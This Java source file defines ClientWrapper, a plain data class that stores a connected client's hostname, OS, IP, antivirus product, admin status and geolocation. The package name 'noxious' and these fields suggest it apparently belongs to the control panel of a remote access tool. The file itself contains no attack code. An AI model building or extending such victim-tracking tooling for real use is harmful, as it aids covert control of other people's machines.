package org.noxious.netty.handlers.client.wrappers;

public class ClientWrapper {

    private ChannelHandlerWrapper channelHandlerWrapper;
    private int clientId;
    private String hostname;
    private String clientName;
    private String os;
    private String ip;
    private String antivirus;
    private boolean isAdmin;
    private String geoLocation;

    public ClientWrapper(ChannelHandlerWrapper channelHandlerWrapper, int clientId, String hostname, String clientName, String os, String ip, String antivirus, boolean isAdmin, String geoLocation) {
        this.channelHandlerWrapper = channelHandlerWrapper;
        this.clientId = clientId;
        this.hostname = hostname;
        this.clientName = clientName;
        this.os = os;
        this.ip = ip;
        this.antivirus = antivirus;
        this.isAdmin = isAdmin;
        this.geoLocation = geoLocation;
    }


    public ChannelHandlerWrapper getChannelWrapper() {
        return channelHandlerWrapper;
    }
    public int getClientId() {
        return clientId;
    }
    public String getHostname() {
        return hostname;
    }
    public String getClientName() {
        return clientName;
    }
    public String getOs() {
        return os;
    }
    public String getIp() {
        return ip;
    }
    public String getAntivirus() {
        return antivirus;
    }
    public boolean isAdmin() {
        return isAdmin;
    }
    public String getGeoLocation() {
        return geoLocation;
    }
}
